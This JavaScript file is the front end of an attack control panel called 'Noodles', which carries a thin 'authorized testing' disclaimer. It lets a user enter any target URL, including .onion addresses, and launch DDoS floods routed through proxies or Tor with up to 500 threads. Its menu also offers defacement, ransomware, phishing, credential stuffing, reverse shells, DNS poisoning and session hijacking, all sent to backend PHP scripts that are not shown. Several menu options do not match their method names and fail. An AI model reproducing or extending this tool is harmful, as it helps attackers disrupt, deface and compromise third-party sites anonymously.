class DDoS {
 constructor() {
  this.logArea = this.createLogArea();
  this.targetInput = this.createTargetInput();
  this.attackTypeSelect = this.createAttackTypeSelect();
  this.startButton = this.createStartButton();
  this.stopButton = this.createStopButton();
  this.customCodeArea = this.createCustomCodeArea();
  this.statsPanel = this.createStatsPanel();
  this.torToggle = this.createTorToggle();
  this.proxyList = this.createProxyList();
  this.proxyRefreshButton = this.createProxyRefreshButton();
  this.threadSlider = this.createThreadSlider();
  this.requestRateSlider = this.createRequestRateSlider();
  this.container = this.createContainer();
  this.sidePanel = this.createSidePanel();
  this.aboutUs = this.createAboutUs();

  this.threadSliderInput = this.threadSlider.querySelector('input');
  this.threadSliderValue = this.threadSlider.querySelector('.noodle-slider-value');
  this.requestRateSliderInput = this.requestRateSlider.querySelector('input');
  this.requestRateSliderValue = this.requestRateSlider.querySelector('.noodle-slider-value');
  this.torToggleInput = this.torToggle.querySelector('input');

  this.appendElements();
  this.setupEventListeners();
  this.initializeValues();
  this.setupUI();

  this.attackRunning = false;
 }

 initializeValues() {
  this.TOR_PROXY = 'socks5://127.0.0.1:9050';
  this.ATTACK_TIMEOUT = 60000;

  this.Key = this.generateKey();
  this.encryptionKey = this.generateEncryptionKey();
  this.log(` Key generated: ${this.Key}`);
  this.log(`Encryption Key generated: ${this.encryptionKey}`);

  this.availableProxies = [];
  this.refreshProxies();

  this.packetsSent = 0;
  this.mbps = 0;
  this.connectionStatus = 'Idle';
  this.errors = 0;
  this.dataSent = 0;
  this.activeThreads = 0;
  this.attackStartTime = null;

  this.requestRate = 50;
  this.isTorEnabled = false;
  this.maxThreads = 100;
  this.target = '';
  this.attackTimeout = null;
  this.attackType = 'ddos';
 }

 setupUI() {
  this.setupResizeHandle();
  this.setupDragHandle();
  this.setupTheme();
  this.toggleCustomCodeArea();
  this.autoFillTarget();

  this.threadSliderInput.value = this.maxThreads;
  this.requestRateSliderInput.value = this.requestRate;

  this.threadSliderValue.textContent = this.maxThreads;
  this.requestRateSliderValue.textContent = this.requestRate;

  this.stopButton.disabled = true;

  this.statsInterval = setInterval(() => this.updateStats(), 1000);
 }

 appendElements() {
  const mainElements = [
   this.targetInput,
   this.attackTypeSelect,
   this.customCodeArea,
   this.threadSlider,
   this.requestRateSlider,
   this.torToggle,
   this.proxyList,
   this.proxyRefreshButton,
   this.startButton,
   this.stopButton,
   this.statsPanel,
   this.logArea
  ];

  mainElements.forEach(element => this.container.appendChild(element));

  document.body.appendChild(this.container);
  document.body.appendChild(this.sidePanel);
  document.body.appendChild(this.aboutUs);
 }

 setupEventListeners() {
  this.attackTypeSelect.addEventListener('change', () => this.toggleCustomCodeArea());
  this.startButton.addEventListener('click', () => this.startAttack());
  this.stopButton.addEventListener('click', () => this.stopAttack());
  this.proxyRefreshButton.addEventListener('click', () => this.refreshProxies());
  this.torToggleInput.addEventListener('change', () => this.toggleTor());

  this.threadSliderInput.addEventListener('input', () => this.updateThreadCount());
  this.requestRateSliderInput.addEventListener('input', () => this.updateRequestRate());
 }

 updateThreadCount() {
  this.maxThreads = parseInt(this.threadSliderInput.value);
  this.threadSliderValue.textContent = this.maxThreads;
 }

 updateRequestRate() {
  this.requestRate = parseInt(this.requestRateSliderInput.value);
  this.requestRateSliderValue.textContent = this.requestRate;
 }

 createRequestRateSlider() {
  return this.createSlider('Request Rate (req/s): ', 10, 200, 50);
 }

 createThreadSlider() {
  return this.createSlider('Threads: ', 10, 500, 100);
 }

 createSlider(labelText, min, max, defaultValue) {
  const sliderContainer = document.createElement('div');
  sliderContainer.classList.add('noodle-slider-container');

  const label = document.createElement('label');
  label.textContent = labelText;
  label.classList.add('noodle-label');
  sliderContainer.appendChild(label);

  const slider = document.createElement('input');
  slider.type = 'range';
  slider.min = min;
  slider.max = max;
  slider.value = defaultValue;
  slider.classList.add('noodle-slider');
  sliderContainer.appendChild(slider);

  const valueDisplay = document.createElement('span');
  valueDisplay.textContent = defaultValue;
  valueDisplay.classList.add('noodle-slider-value');
  sliderContainer.appendChild(valueDisplay);

  return sliderContainer;
 }

 createProxyRefreshButton() {
  const button = document.createElement('button');
  button.textContent = 'Refresh Proxies';
  button.classList.add('noodle-button');
  return button;
 }

 async refreshProxies() {
  this.log('Refreshing proxy list... ');
  try {
   const response = await fetch('main/proxies.json', {
    method: 'GET',
    headers: {
     'X--Key': this.Key
    }
   });

   if (response.ok) {
    const data = await response.json();
    this.availableProxies = data.proxies;
    this.populateProxyList();
    this.log(`Proxies refreshed. Found ${this.availableProxies.length} proxies.`);
   } else {
    this.log('Failed to refresh proxies.');
   }
  } catch (error) {
   this.log(`Error refreshing proxies: ${error}`);
  }
 }

 populateProxyList() {
  this.proxyList.innerHTML = '';
  if (this.availableProxies && this.availableProxies.length > 0) {
   this.availableProxies.forEach(proxy => {
    const option = document.createElement('option');
    option.value = proxy;
    option.textContent = proxy;
    this.proxyList.appendChild(option);
   });
  } else {
   const option = document.createElement('option');
   option.textContent = 'No proxies available';
   this.proxyList.appendChild(option);
  }
 }

 createProxyList() {
  const select = document.createElement('select');
  select.classList.add('noodle-input');
  return select;
 }

 createTorToggle() {
  const torToggle = document.createElement('div');
  torToggle.classList.add('noodle-tor-container');

  const label = document.createElement('label');
  label.htmlFor = 'torToggle';
  label.textContent = 'Use Tor';
  label.classList.add('noodle-label');
  torToggle.appendChild(label);

  const input = document.createElement('input');
  input.type = 'checkbox';
  input.id = 'torToggle';
  torToggle.appendChild(input);

  return torToggle;
 }

 toggleTor() {
  this.isTorEnabled = this.torToggleInput.checked;
  this.log(`Tor usage: ${this.isTorEnabled ? 'Enabled' : 'Disabled'}`);
 }

 updateStats() {
  let elapsedTime = 0;
  if (this.attackStartTime) {
   elapsedTime = Math.floor((Date.now() - this.attackStartTime) / 1000);
  }
  const minutes = Math.floor(elapsedTime / 60);
  const seconds = elapsedTime % 60;

  const statsHtml = `
   <p>Target: ${this.target}</p>
   <p>Attack Type: ${this.attackType}</p>
   <p>MBPS: ${this.mbps.toFixed(2)}</p>
   <p>Packets Sent: ${this.packetsSent}</p>
   <p>Data Sent: ${(this.dataSent / 1024 / 1024).toFixed(2)} MB</p>
   <p>Connection Status: ${this.connectionStatus}</p>
   <p>Errors: ${this.errors}</p>
   <p>Active Threads: ${this.activeThreads}</p>
   <p>Time Elapsed: ${minutes}m ${seconds}s</p>
  `;
  this.statsPanel.innerHTML = statsHtml;
 }

 createStatsPanel() {
  const statsPanel = document.createElement('div');
  statsPanel.classList.add('noodle-stats');
  return statsPanel;
 }

 autoFillTarget() {
  const params = new URLSearchParams(window.location.search);
  const target = params.get('target');
  if (target) {
   this.targetInput.value = target;
  }
 }

 setupTheme() {
  document.body.classList.add('noodle-dark-theme');
 }

 createLogArea() {
  const logArea = document.createElement('textarea');
  logArea.readOnly = true;
  logArea.classList.add('noodle-log');
  return logArea;
 }

 createTargetInput() {
  const targetInput = document.createElement('input');
  targetInput.type = 'text';
  targetInput.placeholder = 'Target URL (.onion or normal)';
  targetInput.classList.add('noodle-input');
  return targetInput;
 }

 createAttackTypeSelect() {
  const attackTypeSelect = document.createElement('select');
  const attackTypes = ['DDoS', 'Deface', 'Connect', 'Exploit', 'Brute Force', 'Custom', 'Ransomware', 'Phishing', 'Data Breach', 'Botnet', 'Zero-Day', 'SQL Inject', 'XSS', 'Mass Exploit', 'Port Scan', 'Credential Stuffing', 'Network Scan', 'Vuln Scan', 'Reverse Shell', 'DNS Poisoning', 'Session Hijacking'];
  attackTypes.forEach(option => {
   const opt = document.createElement('option');
   opt.value = option.toLowerCase().replace(/ /g, '_').replace(/-/g, '_');
   opt.textContent = option;
   attackTypeSelect.appendChild(opt);
  });
  attackTypeSelect.classList.add('noodle-input');
  return attackTypeSelect;
 }

 createStartButton() {
  const startButton = document.createElement('button');
  startButton.textContent = 'Initiate Attack';
  startButton.classList.add('noodle-button');
  return startButton;
 }

 createStopButton() {
  const stopButton = document.createElement('button');
  stopButton.textContent = 'Stop Attack';
  stopButton.classList.add('noodle-button');
  stopButton.disabled = true;
  return stopButton;
 }

 createCustomCodeArea() {
  const customCodeArea = document.createElement('textarea');
  customCodeArea.placeholder = 'Enter custom JavaScript code for attack';
  customCodeArea.classList.add('noodle-input');
  customCodeArea.classList.add('noodle-custom-code');
  return customCodeArea;
 }

 createContainer() {
  const container = document.createElement('div');
  container.id = 'main-container';
  container.classList.add('noodle-container');
  return container;
 }

 createSidePanel() {
  const sidePanel = document.createElement('div');
  sidePanel.id = 'side-panel';
  sidePanel.classList.add('noodle-side-panel');

  const menuItems = [{
   name: 'DDoS 💥',
   action: () => this.setAttackType('ddos')
  }, {
   name: 'Deface 💀',
   action: () => this.setAttackType('deface')
  }, {
   name: 'Connection 💻',
   action: () => this.setAttackType('connect')
  }, {
   name: 'Ransomware 💣',
   action: () => this.setAttackType('ransomware')
  }, {
   name: 'Port Scan ⚠',
   action: () => this.setAttackType('port_scan')
  }, {
   name: 'Credential Stuffing',
   action: () => this.setAttackType('credential_stuffing')
  }, {
   name: 'Network Scan',
   action: () => this.setAttackType('network_scan')
  }, {
   name: 'Vuln Scan',
   action: () => this.setAttackType('vuln_scan')
  }, {
   name: 'Reverse Shell',
   action: () => this.setAttackType('reverse_shell')
  }, {
   name: 'DNS Poisoning',
   action: () => this.setAttackType('dns_poisoning')
  }, {
   name: 'Session Hijacking',
   action: () => this.setAttackType('session_hijacking')
  }, {
   name: 'About Us',
   action: () => this.showAboutUs()
  }];

  menuItems.forEach(item => {
   const menuItem = document.createElement('div');
   menuItem.textContent = item.name;
   menuItem.classList.add('noodle-menu-item');
   menuItem.addEventListener('click', item.action);
   sidePanel.appendChild(menuItem);
  });

  return sidePanel;
 }

 createAboutUs() {
  const aboutUs = document.createElement('div');
  aboutUs.id = 'about-us';
  aboutUs.classList.add('noodle-about-us');

  aboutUs.innerHTML = `
   <h2>About Noodles</h2>
   <p>Noodles is a cutting-edge penetration testing tool designed to expose vulnerabilities and push the limits of network security. It is intended solely for authorized security assessments. Misuse of this tool is strictly prohibited. </p>
   <p>Created by: Anonymous Group</p>
   <p>Disclaimer: This tool is provided for educational and ethical testing purposes only. The developers are not responsible for any misuse or damage caused by this tool.</p>
   <button id="close-about-us" class="noodle-button">Close</button>
  `;

  const closeButton = aboutUs.querySelector('#close-about-us');
  closeButton.addEventListener('click', () => {
   this.hideAboutUs();
  });

  return aboutUs;
 }

 showAboutUs() {
  this.aboutUs.style.display = 'block';
 }

 hideAboutUs() {
  this.aboutUs.style.display = 'none';
 }

 toggleCustomCodeArea() {
  this.customCodeArea.style.display = this.attackTypeSelect.value === 'custom' ? 'block' : 'none';
 }

 setupDragHandle() {
  const dragHandle = document.createElement('div');
  dragHandle.classList.add('noodle-drag-handle');
  this.container.appendChild(dragHandle);

  let initialX, initialY;

  const startDrag = (e) => {
   initialX = e.clientX - this.container.offsetLeft;
   initialY = e.clientY - this.container.offsetTop;

   document.addEventListener('mousemove', drag);
   document.addEventListener('mouseup', stopDrag);
  };

  const drag = (e) => {
   this.container.style.left = (e.clientX - initialX) + 'px';
   this.container.style.top = (e.clientY - initialY) + 'px';
  };

  const stopDrag = () => {
   document.removeEventListener('mousemove', drag);
   document.removeEventListener('mouseup', stopDrag);
  };

  dragHandle.addEventListener('mousedown', startDrag);
 }

 setupResizeHandle() {
  const resizeHandle = document.createElement('div');
  resizeHandle.classList.add('noodle-resize-handle');
  this.container.appendChild(resizeHandle);

  let initialWidth, initialHeight, initialMouseX, initialMouseY;

  const startResize = (e) => {
   initialWidth = this.container.offsetWidth;
   initialHeight = this.container.offsetHeight;
   initialMouseX = e.clientX;
   initialMouseY = e.clientY;

   document.addEventListener('mousemove', resize);
   document.addEventListener('mouseup', stopResize);
  };

  const resize = (e) => {
   const width = initialWidth + (e.clientX - initialMouseX);
   const height = initialHeight + (e.clientY - initialMouseY);
   this.container.style.width = width + 'px';
   this.container.style.height = height + 'px';
  };

  const stopResize = () => {
   document.removeEventListener('mousemove', resize);
   document.removeEventListener('mouseup', stopResize);
  };

  resizeHandle.addEventListener('mousedown', startResize);
 }

 handleAttackError(attackType, target, error) {
  this.log(`${attackType} attack on ${target} failed: ${error}`);
  this.errors++;
 }

 async exploit(target) {
  this.log(`Attempting to exploit ${target}...`);
  try {
   const response = await fetch(`main/exploit.php?target=${encodeURIComponent(target)}&Key=${this.Key}`, {
    method: 'GET'
   });
   const data = await response.json();
   this.log(data.message);
   if (data.error) this.errors++;
  } catch (error) {
   this.handleAttackError('Exploit', target, error);
  }
 }

 async massExploit() {
  this.log('Starting mass exploit...');
  try {
   const response = await fetch(`main/mass_exploit.php?Key=${this.Key}`, {
    method: 'GET'
   });
   const data = await response.json();
   this.log(data.message);
   if (data.error) this.errors++;
  } catch (error) {
   this.handleAttackError('Mass exploit', 'all targets', error);
  }
 }

 async deface(target) {
  this.log(`Attempting to deface ${target}...`);
  try {
   const response = await fetch(`main/deface.php?target=${encodeURIComponent(target)}&Key=${this.Key}`, {
    method: 'POST'
   });
   const data = await response.json();
   this.log(data.message);
   if (data.error) this.errors++;
  } catch (error) {
   this.handleAttackError('Deface', target, error);
  }
 }

 async connect(target) {
  this.log(`Attempting to connect to ${target}...`);
  try {
   const response = await fetch(`main/connect.php?target=${encodeURIComponent(target)}&Key=${this.Key}`, {
    method: 'GET'
   });
   const data = await response.json();
   this.log(data.message);
   if (data.error) this.errors++;
  } catch (error) {
   this.handleAttackError('Connect', target, error);
  }
 }

 async bruteForce(target) {
  this.log(`Starting brute force attack on ${target}...`);
  try {
   const response = await fetch(`main/brute_force.php?target=${encodeURIComponent(target)}&Key=${this.Key}`, {
    method: 'POST'
   });
   const data = await response.json();
   this.log(data.message);
   if (data.error) this.errors++;
  } catch (error) {
   this.handleAttackError('Brute force', target, error);
  }
 }

 async ddos(target) {
  if (this.attackRunning) {
   this.log('DDoS attack already in progress. Stop before starting a new one.');
   return;
  }

  if (!this.availableProxies || this.availableProxies.length === 0) {
   this.log('No proxies available. Please refresh the proxy list.');
   return;
  }

  this.log(`Initiating DDoS attack on ${target}...`);
  this.connectionStatus = 'Attacking';
  this.attackRunning = true;
  this.startButton.disabled = true;
  this.stopButton.disabled = false;
  this.attackStartTime = Date.now();
  this.packetsSent = 0;
  this.dataSent = 0;
  this.errors = 0;
  this.activeThreads = 0;
  this.target = target;
  this.attackType = 'ddos';

  this.ddosAttackPool(target, this.maxThreads, this.requestRate);

  this.attackTimeout = setTimeout(() => {
   this.stopAttack();
   this.log('DDoS attack stopped automatically after 60 seconds.');
  }, this.ATTACK_TIMEOUT);
 }

 async ddosAttackPool(target, numThreads, requestRate) {
  const promises = [];
  for (let i = 0; i < numThreads; i++) {
   promises.push(this.sendDDoSRequest(target, requestRate));
  }

  await Promise.all(promises);
 }

 async sendDDoSRequest(target, requestRate) {
  if (!this.attackRunning) return;

  try {
   const proxy = this.isTorEnabled ? this.TOR_PROXY : this.proxyList.value;
   const url = `main/ddos.php?target=${encodeURIComponent(target)}&Key=${this.Key}&tor=${this.isTorEnabled}&proxy=${encodeURIComponent(proxy)}&rate=${requestRate}`;
   const response = await fetch(url, {
    method: 'POST'
   });
   const data = await response.json();

   if (data.error) this.errors++;
   this.packetsSent++;
   this.dataSent += data.message.length;

   this.mbps = this.dataSent / (Date.now() - this.attackStartTime) * 8 / 1000000;
  } catch (err) {
   this.handleAttackError('DDoS', target, err);
  } finally {
   if (this.attackRunning) {
    setTimeout(() => this.sendDDoSRequest(target, requestRate), 1000 / requestRate);
    this.activeThreads = this.maxThreads;
   }
  }
 }

 async ransomware(target) {
  this.log(`Simulating ransomware attack on ${target}...`);
  try {
   const response = await fetch(`main/ransomware.php?target=${encodeURIComponent(target)}&Key=${this.Key}`, {
    method: 'POST'
   });
   const data = await response.json();
   this.log(data.message);
   if (data.error) this.errors++;
  } catch (error) {
   this.handleAttackError('Ransomware', target, error);
  }
 }

 async custom(target) {
  this.log(`Executing custom code on ${target}...`);
  try {
   const customCode = this.customCodeArea.value;
   if (!customCode) {
    this.log('No custom code provided.');
    return;
   }
   const response = await fetch(`main/custom.php?target=${encodeURIComponent(target)}&code=${encodeURIComponent(customCode)}&Key=${this.Key}`, {
    method: 'POST'
   });
   const data = await response.json();
   this.log(data.message);
   if (data.error) this.errors++;
  } catch (error) {
   this.handleAttackError('Custom code', target, error);
  }
 }

 async phishing(target) {
  this.log(`Initiating phishing attack targeting: ${target}...`);
  try {
   const response = await fetch(`main/phishing.php?target=${encodeURIComponent(target)}&Key=${this.Key}`, {
    method: 'POST'
   });
   const data = await response.json();
   this.log(data.message);
   if (data.error) this.errors++;
  } catch (error) {
   this.handleAttackError('Phishing', target, error);
  }
 }

 async dataBreach(target) {
  this.log(`Simulating data breach on ${target}...`);
  try {
   const response = await fetch(`main/data_breach.php?target=${encodeURIComponent(target)}&Key=${this.Key}`, {
    method: 'POST'
   });
   const data = await response.json();
   this.log(data.message);
   if (data.error) this.errors++;
  } catch (error) {
   this.handleAttackError('Data breach', target, error);
  }
 }

 async botnet(target) {
  this.log(`Attempting to connect to target: ${target}...`);
  try {
   const response = await fetch(`main/botnet.php?target=${encodeURIComponent(target)}&Key=${this.Key}`, {
    method: 'POST'
   });
   const data = await response.json();
   this.log(data.message);
   if (data.error) this.errors++;
  } catch (error) {
   this.handleAttackError('Botnet', target, error);
  }
 }

 async zero_day(target) {
  this.log(`Attempting zero-day exploit on ${target}...`);
  try {
   const response = await fetch(`main/zero_day.php?target=${encodeURIComponent(target)}&Key=${this.Key}`, {
    method: 'POST'
   });
   const data = await response.json();
   this.log(data.message);
   if (data.error) this.errors++;
  } catch (error) {
   this.handleAttackError('Zero-day', target, error);
  }
 }

 async sql_inject(target) {
  this.log(`Attempting SQL injection on ${target}...`);
  try {
   const response = await fetch(`main/sql_inject.php?target=${encodeURIComponent(target)}&Key=${this.Key}`, {
    method: 'POST'
   });
   const data = await response.json();
   this.log(data.message);
   if (data.error) this.errors++;
  } catch (error) {
   this.handleAttackError('SQL injection', target, error);
  }
 }

 async xss(target) {
  this.log(`Attempting XSS attack on ${target}...`);
  try {
   const response = await fetch(`main/xss.php?target=${encodeURIComponent(target)}&Key=${this.Key}`, {
    method: 'POST'
   });
   const data = await response.json();
   this.log(data.message);
   if (data.error) this.errors++;
  } catch (error) {
   this.handleAttackError('XSS', target, error);
  }
 }

 async port_scan(target) {
  this.log(`Starting port scan on ${target}...`);
  try {
   const response = await fetch(`main/port_scan.php?target=${encodeURIComponent(target)}&Key=${this.Key}`, {
    method: 'POST'
   });
   const data = await response.json();
   this.log(data.message);
   if (data.error) this.errors++;
  } catch (error) {
   this.handleAttackError('Port scan', target, error);
  }
 }

 async credential_stuffing(target) {
  this.log(`Starting credential stuffing attack on ${target}...`);
  try {
   const response = await fetch(`main/credential_stuffing.php?target=${encodeURIComponent(target)}&Key=${this.Key}`, {
    method: 'POST'
   });
   const data = await response.json();
   this.log(data.message);
   if (data.error) this.errors++;
  } catch (error) {
   this.handleAttackError('Credential stuffing', target, error);
  }
 }

 async network_scan(target) {
  this.log(`Starting network scan on ${target}...`);
  try {
   const response = await fetch(`main/network_scan.php?target=${encodeURIComponent(target)}&Key=${this.Key}`, {
    method: 'POST'
   });
   const data = await response.json();
   this.log(data.message);
   if (data.error) this.errors++;
  } catch (error) {
   this.handleAttackError('Network scan', target, error);
  }
 }

 async vuln_scan(target) {
  this.log(`Starting vulnerability scan on ${target}...`);
  try {
   const response = await fetch(`main/vuln_scan.php?target=${encodeURIComponent(target)}&Key=${this.Key}`, {
    method: 'POST'
   });
   const data = await response.json();
   this.log(data.message);
   if (data.error) this.errors++;
  } catch (error) {
   this.handleAttackError('Vulnerability scan', target, error);
  }
 }

 async reverse_shell(target) {
  this.log(`Attempting to establish a reverse shell on ${target}...`);
  try {
   const response = await fetch(`main/reverse_shell.php?target=${encodeURIComponent(target)}&Key=${this.Key}`, {
    method: 'POST'
   });
   const data = await response.json();
   this.log(data.message);
   if (data.error) this.errors++;
  } catch (error) {
   this.handleAttackError('Reverse shell', target, error);
  }
 }

 async dns_poisoning(target) {
  this.log(`Attempting DNS poisoning on ${target}...`);
  try {
   const response = await fetch(`main/dns_poisoning.php?target=${encodeURIComponent(target)}&Key=${this.Key}`, {
    method: 'POST'
   });
   const data = await response.json();
   this.log(data.message);
   if (data.error) this.errors++;
  } catch (error) {
   this.handleAttackError('DNS poisoning', target, error);
  }
 }

 async session_hijacking(target) {
  this.log(`Attempting session hijacking on ${target}...`);
  try {
   const response = await fetch(`main/session_hijacking.php?target=${encodeURIComponent(target)}&Key=${this.Key}`, {
    method: 'POST'
   });
   const data = await response.json();
   this.log(data.message);
   if (data.error) this.errors++;
  } catch (error) {
   this.handleAttackError('Session hijacking', target, error);
  }
 }

 sendRequest(target, method, body = null) {
  const proxy = this.availableProxies[Math.floor(Math.random() * this.availableProxies.length)];
  this.log(`${method} request sent successfully to ${target} via ${proxy}.`);
 }

 generateKey() {
  let key = '';
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  for (let i = 0; i < 32; i++) {
   key += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return key;
 }

 generateEncryptionKey() {
  let key = '';
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+=-`~[]\{}|;\':",./<>?';
  for (let i = 0; i < 64; i++) {
   key += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return key;
 }

 startAttack() {
  const target = this.targetInput.value;
  this.attackType = this.attackTypeSelect.value;

  if (!target) {
   this.log('Please enter a target URL.');
   return;
  }

  if (typeof this[this.attackType] === 'function') {
   this[this.attackType](target);
  } else {
   this.log(`Attack type "${this.attackType}" not implemented.`);
  }
 }

 stopAttack() {
  this.attackRunning = false;
  this.connectionStatus = 'Stopping';
  this.log('Stopping attack...');
  this.startButton.disabled = false;
  this.stopButton.disabled = true;
  this.attackStartTime = null;
  this.activeThreads = 0;
  this.mbps = 0;
  this.packetsSent = 0;
  this.dataSent = 0;
  this.target = '';

  if (this.attackTimeout) {
   clearTimeout(this.attackTimeout);
   this.attackTimeout = null;
  }
 }

 setAttackType(attackType) {
  this.attackType = attackType;
  this.attackTypeSelect.value = attackType;
  this.toggleCustomCodeArea();
 }

 log(message) {
  this.logArea.value += message + '\n';
  this.logArea.scrollTop = this.logArea.scrollHeight;
 }
}

window.addEventListener('load', () => {
 new DDoS();
});